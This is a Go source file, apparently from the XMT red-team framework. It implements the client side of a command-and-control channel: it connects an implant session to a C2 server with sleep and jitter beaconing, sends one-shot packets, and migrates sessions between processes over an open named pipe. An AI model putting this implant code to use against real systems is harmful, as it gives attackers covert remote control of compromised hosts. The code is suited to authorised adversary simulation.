// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

// Package c2 is the primary Command & Control (C2) endpoint for creating and
// managing a C2 Session or spinning up a C2 service.
//
package c2

import (
	"context"
	"net"
	"os"
	"strconv"
	"time"

	"github.com/PurpleSec/logx"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/pipe"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/local"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var (
	// ErrNoHost is an error returned by the Connect and Listen functions when
	// the provided Profile does not provide a host string.
	ErrNoHost = xerr.Sub("empty or nil Host", 0x3F)
	// ErrNoConn is an error returned by the Load* functions when an attempt to
	// discover the parent host failed due to a timeout.
	ErrNoConn = xerr.Sub("other side did not come up", 0x40)
	// ErrInvalidProfile is an error returned by c2 functions when the Profile
	// given is nil.
	ErrInvalidProfile = xerr.Sub("empty or nil Profile", 0x41)
)

// Shoot sends the packet with the specified data to the server and does NOT
// register the device with the Server.
//
// This is used for spending specific data segments in single use connections.
func Shoot(p Profile, n *com.Packet) error {
	return ShootContext(context.Background(), p, n)
}

// Connect creates a Session using the supplied Profile to connect to the
// listening server specified in the Profile.
//
// A Session will be returned if the connection handshake succeeds, otherwise a
// connection-specific error will be returned.
func Connect(l logx.Log, p Profile) (*Session, error) {
	return ConnectContext(context.Background(), l, p)
}

// Load will attempt to find a Session in another process or thread that is
// pending Migration. This function will look on the Pipe name provided for the
// specified duration period.
//
// If a Session is found, it is loaded and the provided log is used for the
// local Session log.
//
// If a Session is not found, or errors, this function returns an error message
// or a timeout with a nil Session.
func Load(l logx.Log, n string, t time.Duration) (*Session, error) {
	return LoadContext(context.Background(), l, n, t)
}

// ShootContext sends the packet with the specified data to the server and does
// NOT register the device with the Server.
//
// This is used for spending specific data segments in single use connections.
//
// This function version allows for setting the Context used.
func ShootContext(x context.Context, p Profile, n *com.Packet) error {
	if p == nil {
		return ErrInvalidProfile
	}
	h, w, t := p.Next()
	if len(h) == 0 {
		return ErrNoHost
	}
	c, err := p.Connect(x, h)
	if err != nil {
		return xerr.Wrap("unable to connect", err)
	}
	if n == nil {
		n = &com.Packet{Device: local.UUID}
	} else if n.Device.Empty() {
		n.Device = local.UUID
	}
	n.Flags |= com.FlagOneshot
	// NOTE(dij): shouldn't this be controlled by the context?
	c.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
	err = writePacket(c, w, t, n)
	if c.Close(); err != nil {
		return xerr.Wrap("unable to write packet", err)
	}
	return nil
}

// ConnectContext creates a Session using the supplied Profile to connect to the
// listening server specified in the Profile.
//
// A Session will be returned if the connection handshake succeeds, otherwise a
// connection-specific error will be returned.
//
// This function version allows for setting the Context passed to the Session.
func ConnectContext(x context.Context, l logx.Log, p Profile) (*Session, error) {
	if p == nil {
		return nil, ErrInvalidProfile
	}
	h, w, t := p.Next()
	if len(h) == 0 {
		return nil, ErrNoHost
	}
	c, err := p.Connect(x, h)
	if err != nil {
		return nil, xerr.Wrap("unable to connect", err)
	}
	var (
		s = &Session{ID: local.UUID, Device: local.Device.Machine}
		n = &com.Packet{ID: SvHello, Device: local.UUID, Job: uint16(util.FastRand())}
	)
	s.host.Set(h)
	if s.log, s.w, s.t, s.sleep = cout.New(l), w, t, p.Sleep(); s.sleep <= 0 {
		s.sleep = DefaultSleep
	}
	if j := p.Jitter(); j >= 0 && j <= 100 {
		s.jitter = uint8(j)
	} else if j == -1 {
		s.jitter = DefaultJitter
	}
	s.Device.MarshalStream(n)
	// KeyCrypt: Generate initial key set here, append to the Packet.
	//           This Packet is NOT encrypted.
	if s.generateSessionKey(n); cout.Enabled {
		s.log.Debug("[%s] Generated KeyCrypt key set!", s.ID)
	}
	if bugtrack.Enabled {
		bugtrack.Track("c2.receiveSingle(): %s KeyCrypt details [%v].", s.ID, s.key)
	}
	// Set an initial write deadline, to make sure that the connection is stable.
	c.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
	if err = writePacket(c, s.w, s.t, n); err != nil {
		c.Close()
		return nil, xerr.Wrap("first Packet write", err)
	}
	// Set an initial read deadline, to make sure that the connection is stable.
	c.SetReadDeadline(time.Now().Add(spawnDefaultTime))
	r, err := readPacket(c, s.w, s.t)
	c.Close()
	if n.Clear(); err != nil {
		return nil, xerr.Wrap("first Packet read", err)
	}
	if r == nil || r.ID != SvComplete {
		return nil, xerr.Sub("first Packet is invalid", 0x42)
	}
	if r.Clear(); cout.Enabled {
		s.log.Info("[%s] Client connected to %q!", s.ID, h)
	}
	r, n = nil, nil
	s.p, s.wake, s.ch = p, make(chan struct{}, 1), make(chan struct{})
	s.frags, s.m = make(map[uint16]*cluster), make(eventer, maxEvents)
	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), time.NewTicker(s.sleep)
	go s.listen()
	go s.m.(eventer).listen(s)
	return s, nil
}

// LoadContext will attempt to find a Session in another process or thread that
// is pending Migration. This function will look on the Pipe name provided for
// the specified duration period.
//
// If a Session is found, it is loaded and the provided log and Context are used
// for the local Session log and parent Context.
//
// If a Session is not found, or errors, this function returns an error message
// or a timeout with a nil Session.
func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Session, error) {
	if len(n) == 0 {
		return nil, xerr.Sub("empty or invalid pipe name", 0x43)
	}
	if ProfileParser == nil {
		return nil, xerr.Sub("no Profile parser loaded", 0x44)
	}
	if t == 0 {
		t = spawnDefaultTime
	}
	if bugtrack.Enabled {
		bugtrack.Track("c2.LoadContext(): Starting Pipe listen on %q.", n)
	}
	var (
		y, f   = context.WithTimeout(x, t)
		v, err = pipe.ListenPerms(pipe.Format(n+"."+strconv.FormatUint(uint64(os.Getpid()), 16)), pipe.PermEveryone)
	)
	if err != nil {
		f()
		return nil, err
	}
	var (
		z = make(chan net.Conn, 1)
		c net.Conn
	)
	go func() {
		if a, e := v.Accept(); e == nil {
			z <- a
		}
	}()
	select {
	case c = <-z:
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Received a connection on %q!.", n)
		}
	case <-y.Done():
	case <-x.Done():
	}
	v.Close()
	if f(); c == nil {
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): No connection was found!")
		}
		return nil, ErrNoConn
	}
	var (
		w   = crypto.NewWriter(crypto.XOR(n), c)
		r   = crypto.NewReader(crypto.XOR(n), c)
		buf [8]byte
		_   = buf[7]
	)
	// Set a connection deadline. I doubt this will fail, but let's be sure.
	c.SetDeadline(time.Now().Add(spawnDefaultTime))
	if err = readFull(r, 3, buf[0:3]); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Read Job failed: %s", err.Error())
		}
		return nil, xerr.Wrap("read Job", err)
	}
	var (
		u = uint16(buf[1]) | uint16(buf[0])<<8
		g = buf[2] == 0xF && u == 0
	)
	b, err := readSlice(r, &buf)
	if err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Read Profile failed: %s", err.Error())
		}
		return nil, xerr.Wrap("read Profile", err)
	}
	var p Profile
	if p, err = ProfileParser(b); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): ParseProfile failed: %s", err.Error())
		}
		return nil, xerr.Wrap("parse Profile", err)
	}
	if bugtrack.Enabled {
		bugtrack.Track("c2.LoadContext(): JobID %d, Spawn = %t.", u, g)
	}
	if b = nil; g { // Spawn
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Starting Spawn!")
		}
		var s *Session
		if s, err = ConnectContext(x, l, p); err == nil {
			buf[0], buf[1] = 'O', 'K'
			w.Write(buf[0:2])
		}
		w.Close()
		c.Close()
		return s, err
	}
	var i device.ID
	if err = i.Read(r); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Read ID failed: %s", err.Error())
		}
		return nil, xerr.Wrap("read ID", err)
	}
	q, err := readProxyInfo(r, &buf)
	if err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Read Proxy failed: %s", err.Error())
		}
		return nil, xerr.Wrap("read Proxy", err)
	}
	copy(local.UUID[:], i[:])
	copy(local.Device.ID[:], i[:])
	var (
		s = &Session{ID: i, Device: local.Device.Machine}
		h string
	)
	// KeyCrypt: Migration data to transfer the Session key.
	if err = readFull(r, data.KeySize, s.key[:]); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Read Session Key failed: %s", err.Error())
		}
		return nil, xerr.Wrap("read Session Key", err)
	}
	if h, s.w, s.t = p.Next(); len(h) == 0 {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Empty/nil Host received.")
		}
		return nil, ErrNoHost
	}
	s.host.Set(h)
	buf[0], buf[1], buf[2], buf[3] = 'O', 'K', 0, 0
	if err = writeFull(w, 2, buf[0:2]); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Write OK failed: %s", err.Error())
		}
		return nil, xerr.Wrap("write OK", err)
	}
	if err = readFull(r, 2, buf[2:4]); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Read OK failed: %s", err.Error())
		}
		return nil, xerr.Wrap("read OK", err)
	}
	w.Close()
	if c.Close(); buf[2] != 'O' && buf[3] != 'K' {
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Bad OK value received.")
		}
		return nil, xerr.Sub("unexpected OK value", 0x45)
	}
	if s.log, s.sleep = cout.New(l), p.Sleep(); s.sleep <= 0 {
		s.sleep = DefaultSleep
	}
	if j := p.Jitter(); j >= 0 && j <= 100 {
		s.jitter = uint8(j)
	} else if j == -1 {
		s.jitter = DefaultJitter
	}
	var (
		o = &com.Packet{ID: RvMigrate, Device: i, Job: u}
		k net.Conn
	)
	s.Device.MarshalStream(o)
	if k, err = p.Connect(x, s.host.String()); err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): First Connect failed: %s", err.Error())
		}
		return nil, xerr.Wrap("first Connect", err)
	}
	// KeyCrypt: Encrypt first packet
	o.Crypt(&s.key)
	// Set an initial write deadline, to make sure that the connection is stable.
	k.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
	if err = writePacket(k, s.w, s.t, o); err != nil {
		if k.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): First Packet write failed: %s", err.Error())
		}
		return nil, xerr.Wrap("first Packet write", err)
	}
	o.Clear()
	// Set an initial read deadline, to make sure that the connection is stable.
	k.SetReadDeadline(time.Now().Add(spawnDefaultTime))
	o, err = readPacket(k, s.w, s.t)
	if k.Close(); err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): First Packet read failed: %s", err.Error())
		}
		return nil, xerr.Wrap("first Packet read", err)
	}
	// KeyCrypt: Decrypt first packet
	o.Crypt(&s.key)
	s.p, s.wake, s.ch = p, make(chan struct{}, 1), make(chan struct{})
	s.frags, s.m = make(map[uint16]*cluster), make(eventer, maxEvents)
	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), time.NewTicker(s.sleep)
	if err = receive(s, nil, o); err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): First Receive failed: %s", err.Error())
		}
		return nil, xerr.Wrap("first receive", err)
	}
	if len(q) > 0 {
		var z Profile
		for i := range q {
			if z, err = ProfileParser(q[i].p); err != nil {
				if s.Close(); bugtrack.Enabled {
					bugtrack.Track("c2.LoadContext(): Proxy Profile Parse failed: %s", err.Error())
				}
				return nil, xerr.Wrap("parse Proxy Profile", err)
			}
			if _, err = s.NewProxy(q[i].n, q[i].b, z); err != nil {
				if s.Close(); bugtrack.Enabled {
					bugtrack.Track("c2.LoadContext(): Proxy Setup failed: %s", err.Error())
				}
				return nil, xerr.Wrap("setup Proxy", err)
			}
		}
	}
	if bugtrack.Enabled {
		bugtrack.Track("c2.LoadContext(): Done, Resuming operations!")
	}
	s.wait()
	go s.listen()
	go s.m.(eventer).listen(s)
	return s, nil
}

// LoadOrConnect will attempt to find a Session in another process or thread that
// is pending Migration. This function will look on the Pipe name provided for
// the specified duration period.
//
// If a Session is found, it is loaded and the provided log and Context are used
// for the local Session log and parent Context.
//
// If a Session is not found or the Migration fails with an error, then this
// function creates a Session using the supplied Profile to connect to the
// listening server specified in the Profile.
//
// A Session will be returned if the connection handshake succeeds, otherwise a
// connection-specific error will be returned.
func LoadOrConnect(x context.Context, l logx.Log, n string, t time.Duration, p Profile) (*Session, error) {
	if s, _ := LoadContext(x, l, n, t); s != nil {
		return s, nil
	}
	return ConnectContext(x, l, p)
}
